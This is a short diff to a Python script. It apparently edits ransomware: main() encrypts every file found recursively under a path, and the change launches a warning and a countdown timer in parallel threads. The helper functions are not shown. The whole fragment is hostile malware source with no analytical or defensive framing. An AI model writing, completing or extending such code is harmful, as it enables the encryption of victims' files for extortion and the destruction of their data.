@@ -46,6 +46,9 @@ def main():
     my_path = Path(path1)
     for file in my_path.glob("**/*.*"):
         crypt(file)
-    warn()
+    warnthread = threading.Thread(target=warn)
+    timerthread = threading.Thread(target=timer)
+    warnthread.start()
+    timerthread.start()
 
 main()
